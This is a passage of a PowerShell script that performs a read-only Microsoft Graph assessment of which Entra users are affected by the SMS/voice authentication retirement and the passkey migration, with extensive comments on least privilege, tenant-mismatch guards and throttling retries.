#Requires -Version 7.0
<#
.SYNOPSIS
    Read-only assessment of users affected by Microsoft's Entra SMS/voice retirement and passkey migration.

.DESCRIPTION
    Correlates the Entra Authentication Methods Policy (AMP) scope for SMS and
    voice with the authentication-method registration report. It does not alter
    users, groups, policies, or authentication methods. Every Graph call is an
    HTTP GET.

    The report distinguishes policy targeting from actual method registration.
    This matters because a user can be targeted by policy but already have a
    passwordless method, or can have a phone-based method registered without
    appearing in the modern AMP scope (for example, via legacy per-user MFA).

    The registration campaign state is also reported, because Microsoft sets it
    to "Microsoft managed" for tenants in scope on September 1, 2026.

.PARAMETER TenantId
    Tenant GUID or verified domain. If omitted, the current Graph context is used,
    or an interactive sign-in is started without forcing a tenant. Always pass this
    when working across multiple tenants; it is what prevents the script from
    silently reusing a Graph session left over from a previous tenant.

.PARAMETER ClientId
    App registration (client) ID for unattended app-only authentication. Requires
    -CertificateThumbprint and -TenantId. Use this for multi-tenant sweeps.

.PARAMETER CertificateThumbprint
    Thumbprint of a certificate in the current user or local machine store, registered
    on the app registration. Client secrets are deliberately not supported.

.PARAMETER OutputPath
    CSV output path. Defaults to a timestamped file beside this script, or in the
    current directory when the script is run without a file path (dot-sourced or pasted).

.PARAMETER IncludeUnaffected
    Includes every enabled user in the CSV. By default, the CSV contains only
    migration candidates: users in SMS/voice policy scope or users with a
    phone-based authentication method registered.

.PARAMETER HtmlReport
    Also writes a self-contained HTML client report beside the CSVs. Off by default: a run
    produces spreadsheets, which is what gets attached to a ticket and worked from.

.PARAMETER ExportTickets
    Also writes a PSA-importable ticket queue. Off by default: most teams raise their own
    tickets and attach the action list, which needs no extra switch.

.PARAMETER TicketHistoryPath
    Records which users have already had a ticket raised, so a re-run does not raise a
    second one for everyone who has not remediated yet. A user returns to the queue only
    if their risk band got worse. Defaults to a file beside the ticket CSV; if you write
    to dated output folders, point this at a stable path per customer or the history will
    not be found.

.PARAMETER IgnoreTicketHistory
    Ticket every actionable user regardless of previous runs. For rebuilding a queue that
    was lost, not for routine use.

.PARAMETER PassThru
    Emits the per-user assessment objects to the pipeline in addition to the summary.

.EXAMPLE
    # Assess a tenant. Writes two spreadsheets: the full assessment and the action list.
    .\Get-EntraSmsVoiceMigrationImpact.ps1 -TenantId contoso.onmicrosoft.com

.EXAMPLE
    .\Get-EntraSmsVoiceMigrationImpact.ps1 -TenantId contoso.onmicrosoft.com `
        -CustomerName "Contoso Manufacturing" -OutputPath D:\ClientEvidence\contoso.csv

.EXAMPLE
    .\Get-EntraSmsVoiceMigrationImpact.ps1 -IncludeUnaffected -OutputPath C:\Reports\Entra-Migration.csv -Verbose

.EXAMPLE
    # Leave service and shared accounts out of the counts and the work queue.
    .\Get-EntraSmsVoiceMigrationImpact.ps1 -TenantId contoso.onmicrosoft.com `
        -ExcludeUpnPattern '^svc-', '^shared-', '^noreply@'

.EXAMPLE
    # Unattended app-only run for a multi-tenant sweep
    .\Get-EntraSmsVoiceMigrationImpact.ps1 -TenantId 00000000-0000-0000-0000-000000000000 `
        -ClientId 11111111-1111-1111-1111-111111111111 `
        -CertificateThumbprint A1B2C3D4E5F60718293A4B5C6D7E8F9012345678 `
        -OutputPath C:\SecureReports\contoso.csv

.NOTES
    Required delegated Microsoft Graph scopes (all read-only):
      Policy.Read.All, AuditLog.Read.All, User.Read.All, GroupMember.Read.All

    Recommended least-privileged Entra role for the signed-in operator:
      Global Reader or Security Reader

    Data source limitations:
      - userRegistrationDetails does not return disabled users. This script reads
        accountEnabled separately and assesses enabled users only.
      - The registration report has reporting latency. OldestReportRowUtc is reported in
        the summary so the age of the evidence is visible.
      - Entra does not store "SMS" and "voice" as separate registrations. It stores a
        phone number with a type, and the type determines capability. mobilePhone can
        serve both SMS and voice; officePhone is voice-only. There is no clean split.
      - Legacy per-user MFA service settings are not read. Users enabled for SMS/voice
        there are also in scope for the retirement. See docs/Microsoft-Migration-Background.md.

    References:
      https://learn.microsoft.com/entra/identity/authentication/concept-sms-voice-retirement
      https://learn.microsoft.com/graph/api/authenticationmethodsroot-list-userregistrationdetails
#>

[CmdletBinding(DefaultParameterSetName = 'Delegated')]
param(
    [Parameter(ParameterSetName = 'Delegated')]
    [Parameter(Mandatory, ParameterSetName = 'AppOnly')]
    [string]$TenantId,

    # App-only authentication. Certificate-based only; client secrets are deliberately
    # not supported, because a secret that can read tenant identity posture across 90+
    # customers is a credential that should not exist in a script parameter.
    [Parameter(Mandatory, ParameterSetName = 'AppOnly')]
    [ValidatePattern('^[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}$')]
    [string]$ClientId,

    [Parameter(Mandatory, ParameterSetName = 'AppOnly')]
    [ValidatePattern('^[0-9a-fA-F]{40}$')]
    [string]$CertificateThumbprint,

    # Defaults to a timestamped file beside the script, with -CustomerName folded into the
    # filename when supplied. Computed after the param block so it can see -CustomerName.
    [Parameter()]
    [string]$OutputPath,

    [Parameter()]
    [switch]$IncludeUnaffected,

    # Skips the legacy per-user MFA read. On by default, and this exists to turn it off.
    #
    # It was opt-in until a real tenant showed what that produced: an action list of nine
    # users, every row identical, every NextStep saying "go and check the legacy portal
    # yourself" -- because without the read the Moderate band cannot tell a live sign-in
    # path from a stale registration. Nine rows of homework is not an action list.
    #
    # The read costs one batched Graph call per twenty users and no extra permission: it
    # is Policy.Read.All, which this script already requests, with Global Reader as a
    # supported role. The only argument for opt-in was that the endpoint is beta, and that
    # does not outweigh shipping an assessment that cannot answer its own Moderate band.
    #
    # A total failure of the read is survivable and reported -- every row says
    # (unreadable) and the summary counts them -- so the default cannot silently mislead.
    [Parameter()]
    [switch]$SkipLegacyPerUserMfa,

    # Writes a .ps1 of remediation commands beside the CSVs, for review and manual running.
    # The assessment still writes nothing to any tenant: this produces a file, and the file
    # refuses to run until a person reads it and deletes a throw at the top.
    [Parameter()]
    [switch]$ExportFixScript,

    # Regular expressions matched against the UPN. A user who matches is marked Excluded
    # and drops out of every count, the action list, the tickets, and the report.
    #
    # A tenant targeting All users surfaces every shared mailbox, sync account, and service
    # account as a migration candidate. They are in scope and nobody signs into them
    # interactively, so ticketing them wastes an afternoon. The naming convention that makes
    # them obvious is local to an estate and cannot be guessed, so it is a parameter.
    #
    # Validated at binding: an unanchored typo that fails to compile should stop the run
    # before any tenant is contacted, not halfway through the row loop.
    [Parameter()]
    [ValidateScript({
            foreach ($pattern in $_) {
                if ([string]::IsNullOrWhiteSpace($pattern)) {
                    throw 'An -ExcludeUpnPattern entry is empty. An empty pattern matches every user.'
                }
                try { [void][regex]::new($pattern) }
                catch { throw "-ExcludeUpnPattern entry '$pattern' is not a valid regular expression: $($_.Exception.Message)" }
            }
            $true
        })]
    [string[]]$ExcludeUpnPattern,

    [Parameter()]
    [string]$CustomerName,

    # Also writes the self-contained HTML client report. Off by default: a run produces
    # spreadsheets, because that is what gets attached to a ticket and worked from. The
    # HTML is for when you want something to hand a client directly.
    [Parameter()]
    [switch]$HtmlReport,

    # Writes a PSA-importable ticket queue. Off by default: most teams raise their own
    # tickets and attach the action list, which needs no extra switch.
    [Parameter()]
    [switch]$ExportTickets,

    [Parameter()]
    [ValidateRange(1, 500)]
    [int]$MaxIndividualTickets = 50,

    # Users already ticketed by a previous run, so a re-run does not raise a second ticket
    # for everyone who has not remediated yet. Defaults to a file beside the ticket CSV.
    # If you write to dated output folders, point this at a stable path per customer or the
    # history will not be found. Pass -IgnoreTicketHistory to deliberately re-raise.
    [Parameter()]
    [string]$TicketHistoryPath,

    [Parameter()]
    [switch]$IgnoreTicketHistory,

    # Output files are restricted to the file owner and local Administrators by default.
    # Use this only where the filesystem rejects ACL changes and you control access another way.
    [Parameter()]
    [switch]$SkipAclHardening,

    [Parameter()]
    [switch]$PassThru
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

if (-not $OutputPath) {
    # Every artefact of a run is named from this one path, so folding the customer in here
    # names all of them at once. Running five clients back to back otherwise produces five
    # sets of files distinguishable only by timestamp, which is a poor thing to be sorting
    # out at the point you are attaching one of them to a ticket.
    #
    # The tool stem stays at the front: the .gitignore rule that stops a live export being
    # committed anchors on it, and a filename that quietly slips past that rule is worse
    # than one that reads slightly less naturally.
    $stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
    $baseDirectory = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }

    $customerPart = ''
    if ($CustomerName) {
        # Operator-supplied and often pasted from a PSA export, so treat it as untrusted:
        # strip path characters and traversal before it reaches a filename.
        $safeCustomer = ($CustomerName -replace '[\\/:*?"<>|]', '_') -replace '\s+', '-'
        $safeCustomer = [System.IO.Path]::GetFileName($safeCustomer.Trim().Trim('.'))
        if ($safeCustomer) { $customerPart = "$safeCustomer`_" }
    }

    $OutputPath = Join-Path -Path $baseDirectory -ChildPath "EntraSmsVoiceMigrationImpact_$customerPart$stamp.csv"
}

# Graph endpoints are declared once so the read-only surface of this script is auditable at a glance.
$script:GraphBase = 'https://graph.microsoft.com/v1.0'

# Beta is used for exactly one thing: reading legacy per-user MFA state, which has no v1.0
# equivalent. Kept behind -IncludeLegacyPerUserMfa so the default run stays on v1.0 only,
# and named separately so the beta surface of this script is one line to audit.
$script:GraphBeta = 'https://graph.microsoft.com/beta'

# The two non-verdicts the PerUserMfaState column can carry. Both are deliberately not
# blank: an empty cell in a spreadsheet reads as "no", and "no" is exactly the answer this
# column must never give when it does not know.
$script:PerUserMfaNotChecked = '(not checked)'
$script:PerUserMfaUnreadable = '(unreadable)'

# Same rule as PerUserMfaState: never blank. An empty cell in a spreadsheet column called
# DaysSinceLastSignIn reads as zero, which is the opposite of what no data means.
# Not '(never)': Microsoft keeps interactive sign-in history back to April 2020 only, so
# an absent record means "never, or not since April 2020". Both are six years idle and
# treated the same here, but the column should not assert the stronger claim.
$script:SignInAgeNever = '(none recorded)'
$script:SignInAgeUnavailable = '(not available)'

# Past this, an account on a work queue is more likely a missed leaver than a person to
# chase. Not a hard rule and not used to drop anybody -- it only annotates and counts.
$script:StaleSignInDays = 90

# Group display names are resolved once and reused; the same exclusion group is commonly
# referenced by both the SMS and voice method configurations.
$script:GroupNameCache = @{}

# Parameter-set detection is done once here rather than via $PSCmdlet, which is not
# addressable from inside the plain functions below.
$script:IsAppOnly = $PSBoundParameters.ContainsKey('CertificateThumbprint')

function Get-PropertyValue {
    # StrictMode Latest throws on missing properties. Graph omits properties rather than
    # returning nulls, so every read of a Graph payload goes through this accessor.
    param($Object, [Parameter(Mandatory)][string]$Name)

    if ($null -eq $Object) { return $null }
    $property = $Object.PSObject.Properties[$Name]
    if ($property) { return $property.Value }
    return $null
}

function Assert-GraphDependency {
    if (-not (Get-Module -ListAvailable -Name Microsoft.Graph.Authentication)) {
        throw @'
Microsoft.Graph.Authentication is required but is not installed.
Install it for the current user with:
  Install-Module Microsoft.Graph.Authentication -Scope CurrentUser
'@
    }
    Import-Module Microsoft.Graph.Authentication -ErrorAction Stop
}

function Test-RowFlag {
    # Whether a row's boolean-ish column is true, for a row that may have been through a CSV.
    #
    # [bool] is the trap. `[bool]'False'` is $true, because a non-empty string is truthy --
    # so `[bool]$_.BlockedAtRetirement` was correct on an in-memory row and silently always
    # true on the same row imported from a CSV, which made the blocked-users-first sort a
    # no-op for anyone piping an exported file back in. Comparing the string form works for
    # both, since [string]$true is 'True'.
    param([AllowNull()]$Value)
    return ([string]$Value) -eq 'True'
}

function Get-SignInAgeSortKey {
    # Days as a number for ordering, or int.MaxValue for any marker.
    #
    # Parsed rather than type-tested. The same row is an int in memory and a string once it
    # has been through a CSV, so `-is [int]` sorted the two paths differently and the
    # published sample stopped matching what the function generates -- a drift the samples
    # test exists to catch, and did.
    param([AllowNull()]$Value)

    $parsed = 0
    if ([int]::TryParse([string]$Value, [ref]$parsed)) { return $parsed }
    return [int]::MaxValue
}

function Get-SignInAge {
    <#
    .SYNOPSIS
        Whole days since a user last signed in, or a marker saying why there is no number.
    .DESCRIPTION
        Answers the question a technician asks first about a name on a work queue: is this
        a person, or an account nobody has used since a leaver process missed it. A row
        saying "last signed in 400 days ago" is a deprovisioning ticket, not a passkey one.

        lastSuccessfulSignInDateTime is preferred over lastSignInDateTime because the
        latter records attempts, including failures, so a locked-out ex-employee whose old
        phone keeps retrying looks active. Falls back to it when the newer property is
        absent, since Microsoft did not backfill it.
    #>
    param(
        [AllowNull()]$SignInActivity,
        [Parameter(Mandatory)][datetime]$Now
    )

    # Graph omits signInActivity entirely for a user with no recorded sign-in, so an absent
    # object here is an answer rather than a gap -- the caller handles the real gap, which
    # is the tenant not being licensed to report sign-in activity at all.
    if ($null -eq $SignInActivity) { return $script:SignInAgeNever }

    $stamp = Get-PropertyValue $SignInActivity 'lastSuccessfulSignInDateTime'
    if (-not $stamp) { $stamp = Get-PropertyValue $SignInActivity 'lastSignInDateTime' }
    if (-not $stamp) { return $script:SignInAgeNever }

    try { $when = [datetime]$stamp } catch { return $script:SignInAgeUnavailable }
    return [int][math]::Max(0, ($Now - $when.ToUniversalTime()).TotalDays)
}

function Resolve-TenantIdentifier {
    <#
    .SYNOPSIS
        Normalises whatever somebody actually typed into -TenantId, or explains why it
        cannot be one.
    .DESCRIPTION
        -TenantId wants a tenant GUID or a verified domain. The thing people reach for is
        the account they sign in with, because that is the credential in their head:

            -TenantId Administrator@contoso.org

        Graph answers that with "Invalid tenant id provided" and a link to a documentation
        page about finding your tenant ID -- which is a long way round for a fix that is
        deleting nine characters. The domain half of a UPN is the tenant's domain in every
        ordinary case, so take it and say so rather than failing.

        Anything that is neither a GUID nor domain-shaped fails here, at parameter time,
        instead of after a sign-in prompt has already been answered.
    #>
    param([AllowNull()][AllowEmptyString()][string]$Value)

    if ([string]::IsNullOrWhiteSpace($Value)) { return $null }
    $trimmed = $Value.Trim()

    if ($trimmed -match '^[^@\s]+@(?<domain>[^@\s]+)$') {
        $domain = $Matches.domain
        Write-Warning "-TenantId was given the sign-in name '$trimmed'. Using the domain '$domain' as the tenant, and you can sign in as that account at the prompt. Pass '$domain' directly, or omit -TenantId altogether, to skip this message."
        $trimmed = $domain
    }

    $isGuid = $trimmed -match '^[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}$'
    # A verified domain always has a dot. onmicrosoft.com tenants included.
    $isDomain = $trimmed -match '^[A-Za-z0-9][A-Za-z0-9-]*(\.[A-Za-z0-9][A-Za-z0-9-]*)+$'
    # Entra's own multi-tenant aliases. Allowed because Connect-MgGraph accepts them and
    # the run reports the tenant it actually reached, so neither can mislabel a report.
    $isAlias = $trimmed -in @('common', 'organizations')

    if (-not ($isGuid -or $isDomain -or $isAlias)) {
        throw @"
-TenantId '$Value' is not a tenant identifier.

It wants one of:
  a tenant GUID       e.g. c0ffee00-1111-4222-8333-444455556666
  a verified domain   e.g. contoso.org  or  contoso.onmicrosoft.com

Or omit -TenantId entirely and sign in interactively -- the run then reports whichever
tenant you signed in to, which is the simplest thing to do for a single customer.
"@
    }

    return $trimmed
}

function Connect-AssessmentGraph {
    # Reads $TenantId, $ClientId and $CertificateThumbprint straight out of the script's
    # param block rather than taking them as parameters, and that is deliberate. This is
    # the script's own connect step: it is called once, from one place, and is meaningless
    # anywhere else. Every other function that touched ambient state was doing it by
    # accident and has been given real parameters; tests/RepoHygiene.Tests.ps1 keeps it
    # that way and names this function as the one allowed exception.
    #
    # Least-privilege read permissions only. Nothing here grants write access to any object.
    # Delegated: these are requested as scopes.
    # App-only: the same four must be granted as APPLICATION permissions on the app registration.
    $requiredScopes = @(
        'Policy.Read.All'
        'AuditLog.Read.All'
        'User.Read.All'
        'GroupMember.Read.All'
    )

    if ($script:IsAppOnly) {
        # Unattended path for multi-tenant sweeps. Always disconnects first: a reused context
        # is how one customer's identity posture ends up in another customer's evidence folder.
        Disconnect-MgGraph -ErrorAction SilentlyContinue | Out-Null
        Connect-MgGraph -TenantId $TenantId -ClientId $ClientId `
            -CertificateThumbprint $CertificateThumbprint -NoWelcome -ErrorAction Stop | Out-Null
    }
    else {
        $context = Get-MgContext -ErrorAction SilentlyContinue
        $currentScopes = if ($context) { @(Get-PropertyValue $context 'Scopes') } else { @() }
        $hasScopes = $context -and (@($requiredScopes | Where-Object { $_ -notin $currentScopes }).Count -eq 0)

        # A stale session from a previous tenant is the most common cross-tenant reporting error,
        # so an explicit -TenantId must match the live context or a fresh sign-in is forced.
        $correctTenant = (-not $TenantId) -or ($context -and (($context.TenantId -eq $TenantId) -or ($context.Account -like "*@$TenantId")))

        if (-not ($hasScopes -and $correctTenant)) {
            $connect = @{ Scopes = $requiredScopes; NoWelcome = $true }
            if ($TenantId) { $connect.TenantId = $TenantId }
            Connect-MgGraph @connect | Out-Null
        }
    }

    $finalContext = Get-MgContext
    if (-not $finalContext) { throw 'Microsoft Graph connection was not established.' }

    $identity = if ($script:IsAppOnly) { "app $ClientId" } else { [string](Get-PropertyValue $finalContext 'Account') }

    # Hard guard against reporting the wrong customer. If an explicit -TenantId was supplied
    # and the established context does not match it, stop rather than write a mislabelled CSV.
    if ($TenantId -and $TenantId -match '^[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}$' -and $finalContext.TenantId -ne $TenantId) {
        throw "Connected tenant $($finalContext.TenantId) does not match requested tenant $TenantId. Aborting to avoid a mislabelled report."
    }

    Write-Host "Connected tenant: $($finalContext.TenantId) as $identity" -ForegroundColor Cyan
    return $finalContext
}

function Invoke-GraphGet {
    # Single GET with bounded exponential backoff. Graph throttles report and directory
    # endpoints aggressively at multi-thousand-user scale; an unhandled 429 halfway through
    # pagination produces a silently incomplete assessment, which is worse than a slow one.
    param(
        [Parameter(Mandatory)][string]$Uri,
        [ValidateRange(1, 10)][int]$MaxAttempts = 5
    )

    $attempt = 0
    while ($true) {
        $attempt++
        try {
            return Invoke-MgGraphRequest -Method GET -Uri $Uri -OutputType PSObject -ErrorAction Stop
        }
        catch {
            $status = $null
            $responseProperty = $_.Exception.PSObject.Properties['Response']
            if ($responseProperty -and $responseProperty.Value) {
                $status = [int]$responseProperty.Value.StatusCode
            }

            # Only transient server-side conditions are retried. 401/403/404 fail fast.
            if ($attempt -ge $MaxAttempts -or $status -notin @(429, 503, 504)) { throw }

            $delaySeconds = [math]::Min(60, [math]::Pow(2, $attempt))
            Write-Verbose "Graph returned HTTP $status for $Uri. Retry $attempt of $MaxAttempts in $delaySeconds second(s)."
            Start-Sleep -Seconds $delaySeconds
        }
    }
}

function Get-GraphCollection {
    # Follows @odata.nextLink to completion. Partial pagination is treated as a hard failure
    # by Invoke-GraphGet rather than being swallowed into a short result set.
    param([Parameter(Mandatory)][string]$Uri)

    $items = [System.Collections.Generic.List[object]]::new()
    $next = $Uri
    while ($next) {
        $response = Invoke-GraphGet -Uri $next
        if ($response.PSObject.Properties.Name -contains 'value') {
            foreach ($item in @($response.value)) { $items.Add($item) }
            $next = Get-PropertyValue $response '@odata.nextLink'
        }
        else {
            $items.Add($response)
            $next = $null
        }
    }
    return $items.ToArray()
}

function Invoke-GraphBatch {
    # The one non-GET call this script makes, and it is still a read: JSON batching is a
    # POST by protocol, and every request inside the envelope is a GET. Kept here rather
    # than folded into Invoke-GraphGet so the write-shaped verb is visible in one place.
    param(
        [Parameter(Mandatory)][string]$Uri,
        [Parameter(Mandatory)][object[]]$Request,
        [ValidateRange(1, 10)][int]$MaxAttempts = 5
    )

    # @() around $Request matters: ConvertTo-Json serialises a one-element array as a bare
    # object, and Graph rejects a requests property that is not an array.
    $body = @{ requests = @($Request) } | ConvertTo-Json -Depth 5 -Compress

    $attempt = 0
    while ($true) {
        $attempt++
        try {
            return Invoke-MgGraphRequest -Method POST -Uri $Uri -Body $body `
                -ContentType 'application/json' -OutputType PSObject -ErrorAction Stop
        }
        catch {
            $status = $null
            $responseProperty = $_.Exception.PSObject.Properties['Response']
            if ($responseProperty -and $responseProperty.Value) {
                $status = [int]$responseProperty.Value.StatusCode
            }

            if ($attempt -ge $MaxAttempts -or $status -notin @(429, 503, 504)) { throw }

            $delaySeconds = [math]::Min(60, [math]::Pow(2, $attempt))
            Write-Verbose "Graph returned HTTP $status for the batch at $Uri. Retry $attempt of $MaxAttempts in $delaySeconds second(s)."
            Start-Sleep -Seconds $delaySeconds
        }
    }
}

function Get-LegacyPerUserMfaState {
    <#
    .SYNOPSIS
        Reads legacy per-user MFA state for the given users, returning a hashtable of
        object ID to state ('disabled', 'enabled', 'enforced', or the unreadable marker).
    .DESCRIPTION
        The assessment's one real blind spot. Users enabled for SMS or voice through the
        legacy per-user MFA service settings are in scope for the retirement, and that
        state has no v1.0 equivalent -- it is readable only at
        GET /beta/users/{id}/authentication/requirements.

        One call per user would be one call per user, so this batches twenty at a time.
        Throttled or transient per-request failures are retried in later rounds; anything
        still unanswered is marked unreadable rather than absent, because a missing entry
        would read downstream as "no legacy MFA" and mark somebody safe who is not.
    #>
    param(
        [Parameter(Mandatory)][AllowEmptyCollection()][string[]]$UserId,
        [ValidateRange(1, 20)][int]$BatchSize = 20,
        [ValidateRange(1, 10)][int]$MaxRounds = 4
    )

    $state = @{}
    if ($null -eq $UserId -or $UserId.Count -eq 0) { return $state }

    $pending = [System.Collections.Generic.List[string]]::new()
    foreach ($id in $UserId) { $pending.Add($id) }

    for ($round = 1; $round -le $MaxRounds -and $pending.Count -gt 0; $round++) {
        $retry = [System.Collections.Generic.List[string]]::new()

        for ($offset = 0; $offset -lt $pending.Count; $offset += $BatchSize) {
            $take = [math]::Min($BatchSize, $pending.Count - $offset)
            $chunk = @($pending.GetRange($offset, $take))

            # Correlation IDs are positional rather than the object ID: Graph requires them
            # unique within the batch and does not promise the responses come back in order.
            $requests = [System.Collections.Generic.List[object]]::new()
            $byRequestId = @{}
            for ($i = 0; $i -lt $chunk.Count; $i++) {
                $requestId = [string]($i + 1)
                $byRequestId[$requestId] = $chunk[$i]
                $requests.Add(@{
                        id     = $requestId
                        method = 'GET'
                        url    = "/users/$($chunk[$i])/authentication/requirements"
                    })
            }

            $response = Invoke-GraphBatch -Uri "$script:GraphBeta/`$batch" -Request $requests.ToArray()
            $answered = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)

            foreach ($item in @($response.responses)) {
                $requestId = [string](Get-PropertyValue $item 'id')
                if (-not $byRequestId.ContainsKey($requestId)) { continue }
                $subjectId = $byRequestId[$requestId]
                [void]$answered.Add($subjectId)

                $status = [int](Get-PropertyValue $item 'status')
                if ($status -eq 200) {
                    $itemBody = Get-PropertyValue $item 'body'
                    $value = if ($itemBody) { [string](Get-PropertyValue $itemBody 'perUserMfaState') } else { '' }
                    $state[$subjectId] = if ([string]::IsNullOrWhiteSpace($value)) { $script:PerUserMfaUnreadable } else { $value }
                }
                elseif ($status -in @(429, 503, 504)) {
                    # A 429 inside a batch is not retried by anything above us: the batch
                    # itself succeeded with 200.
                    $retry.Add($subjectId)
                }
                else {
                    $state[$subjectId] = $script:PerUserMfaUnreadable
                }
            }

            # A request the batch simply did not answer is a transient shape, not a verdict.
            foreach ($id in $chunk) {
                if (-not $answered.Contains($id)) { $retry.Add($id) }
            }
        }

        $pending = $retry
        if ($pending.Count -gt 0 -and $round -lt $MaxRounds) {
            $delaySeconds = [math]::Min(60, [math]::Pow(2, $round))
            Write-Verbose "$($pending.Count) per-user MFA read(s) were throttled. Retry round $round in $delaySeconds second(s)."
            Start-Sleep -Seconds $delaySeconds
        }
    }

    # Never leave a user out of the result. An absent key reads downstream as no legacy
    # exposure, which is the one wrong answer that costs somebody their sign-in.
    foreach ($id in $pending) { $state[$id] = $script:PerUserMfaUnreadable }
    return $state
}

function Get-GroupDisplayName {
    # Raw GUIDs in a client deliverable are unreadable. Resolved once per group and cached,
    # because a tenant can reference the same exclusion group in both SMS and voice policies.
    # displayName is a basic group property, so GroupMember.Read.All already covers this.
    param([Parameter(Mandatory)][string]$GroupId)

    if ($script:GroupNameCache.ContainsKey($GroupId)) { return $script:GroupNameCache[$GroupId] }

    $name = $GroupId
    try {
        # Escaped even though Graph supplies this value; never build a URI from an
        # unescaped identifier, regardless of how trustworthy the source looks today.
        $group = Invoke-GraphGet -Uri "$($script:GraphBase)/groups/$([uri]::EscapeDataString($GroupId))?`$select=displayName"
        $displayName = [string](Get-PropertyValue $group 'displayName')
        if (-not [string]::IsNullOrWhiteSpace($displayName)) { $name = $displayName }
    }
    catch {
        # A deleted or inaccessible group must not fail the assessment; fall back to the GUID.
        Write-Verbose "Could not resolve display name for group $GroupId : $($_.Exception.Message)"
    }

    $script:GroupNameCache[$GroupId] = $name
    return $name
}

function Get-TargetId {
    param($Target)
    $id = Get-PropertyValue $Target 'id'
    if (-not $id) { $id = Get-PropertyValue $Target 'Id' }
    return [string]$id
}

function Get-TargetType {
    param($Target)
    $type = Get-PropertyValue $Target 'targetType'
    if (-not $type) { $type = Get-PropertyValue $Target 'TargetType' }
    return [string]$type
}

function Get-RegistrationCampaignState {
    # Microsoft flips this to "Microsoft managed" for in-scope tenants on 2026-09-01,
    # which is what triggers the end-user passkey nudge. Reported, never modified.
    $policy = Invoke-GraphGet -Uri "$script:GraphBase/policies/authenticationMethodsPolicy"
    $enforcement = Get-PropertyValue $policy 'registrationEnforcement'
    $campaign = Get-PropertyValue $enforcement 'authenticationMethodsRegistrationCampaign'
    $state = [string](Get-PropertyValue $campaign 'state')

    if ([string]::IsNullOrWhiteSpace($state)) { return 'unknown' }
    # Graph reports the Microsoft-managed default as 'default'; surface the portal wording.
    if ($state -eq 'default') { return 'default (Microsoft managed)' }
    return $state
}

function Get-MethodPolicyScope {
    # Resolves AMP include/exclude targets to a concrete user-id set. Exclusions are applied
    # after all inclusions because Entra evaluates exclude as an override, not an ordered filter.
    param(
        [Parameter(Mandatory)][ValidateSet('sms', 'voice')][string]$Method,
        [Parameter(Mandatory)][hashtable]$EnabledUserIndex
    )

    $config = Invoke-GraphGet -Uri "$script:GraphBase/policies/authenticationMethodsPolicy/authenticationMethodConfigurations/$Method"
    $state = [string](Get-PropertyValue $config 'state')

    $result = [ordered]@{
        Method       = $Method
        State        = $state
        UserIds      = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
        IncludeNotes = [System.Collections.Generic.List[string]]::new()
        ExcludeNotes = [System.Collections.Generic.List[string]]::new()
        # Targets this script could not resolve to users. Returned rather than tracked in a
        # global so the caller cannot forget to look, and so this is testable in isolation.
        UnresolvedTargets = [System.Collections.Generic.List[string]]::new()
    }

    # A disabled method has no effective scope, but registered methods are still assessed later.
    if ($state -ne 'enabled') { return [PSCustomObject]$result }

    $includeTargets = @((Get-PropertyValue $config 'includeTargets'))
    $excludeTargets = @((Get-PropertyValue $config 'excludeTargets'))

    foreach ($target in $includeTargets) {
        $type = Get-TargetType $target
        $id = Get-TargetId $target
        if (-not $id) { continue }

        if ($id -eq 'all_users') {
            foreach ($userId in $EnabledUserIndex.Keys) { [void]$result.UserIds.Add($userId) }
            $result.IncludeNotes.Add('All enabled users (members and guests)')
        }
        elseif ($type -eq 'user') {
            if ($EnabledUserIndex.ContainsKey($id)) { [void]$result.UserIds.Add($id) }
            $result.IncludeNotes.Add("User: $id")
        }
        elseif ($type -eq 'group') {
            # transitiveMembers is required: AMP group targeting honours nested membership.
            $members = Get-GraphCollection -Uri "$script:GraphBase/groups/$id/transitiveMembers/microsoft.graph.user?`$select=id&`$top=999"
            foreach ($member in $members) {
                $memberId = [string](Get-PropertyValue $member 'id')
                if ($EnabledUserIndex.ContainsKey($memberId)) { [void]$result.UserIds.Add($memberId) }
            }
            $result.IncludeNotes.Add("Group: $(Get-GroupDisplayName -GroupId $id) [$id] ($($members.Count) transitive user members)")
        }
        else {
            # The dangerous direction. A target type this script does not handle -- a value
            # Microsoft adds later, 'unknownFutureValue', or any shape not seen here -- used
            # to be dropped without a word, so every user it covered read as out of scope
            # and the tenant reported as safer than it is. Nothing in the CSV, the summary,
            # or the console said the scope was incomplete.
            #
            # It still cannot be resolved to users: guessing who a target covers would be
            # worse than admitting the gap. So it is recorded, counted, and warned about,
            # and the in-scope figure is stated as a floor rather than a total.
            $note = "UNRESOLVED include target: targetType '$type' id '$id'"
            $result.IncludeNotes.Add($note)
            $result.UnresolvedTargets.Add("$Method include: targetType '$type' id '$id'")
        }
    }

    foreach ($target in $excludeTargets) {
        $type = Get-TargetType $target
        $id = Get-TargetId $target
        if (-not $id) { continue }

        if ($type -eq 'user') {
            [void]$result.UserIds.Remove($id)
            $result.ExcludeNotes.Add("User: $id")
        }
        elseif ($type -eq 'group') {
            $members = Get-GraphCollection -Uri "$script:GraphBase/groups/$id/transitiveMembers/microsoft.graph.user?`$select=id&`$top=999"
            foreach ($member in $members) {
                [void]$result.UserIds.Remove([string](Get-PropertyValue $member 'id'))
            }
            $result.ExcludeNotes.Add("Group: $(Get-GroupDisplayName -GroupId $id) [$id] ($($members.Count) transitive user members)")
        }
        else {
            # An unresolved exclude fails the other way: those users stay in scope and are
            # over-reported, which costs a review rather than a lockout. Recorded anyway,
            # because an operator chasing a user who should not be on the list deserves to
            # know the exclusion was not applied.
            $note = "UNRESOLVED exclude target: targetType '$type' id '$id'"
            $result.ExcludeNotes.Add($note)
            $result.UnresolvedTargets.Add("$Method exclude: targetType '$type' id '$id'")
        }
    }

    return [PSCustomObject]$result
}

function Get-RiskAssessment {
    # Ordering is deliberate: the most specific and most damaging combination is evaluated first.
    # "Passwordless capable" is the mitigating control, since it is the only method class that
    # survives the February 1, 2027 retirement without a customer-managed telecom provider.
    param(
        [bool]$InPolicyScope,
        [bool]$HasPhoneMethodRegistered,
        [bool]$IsPasswordlessCapable,
        [bool]$IsAdmin,
        [string]$UserType,

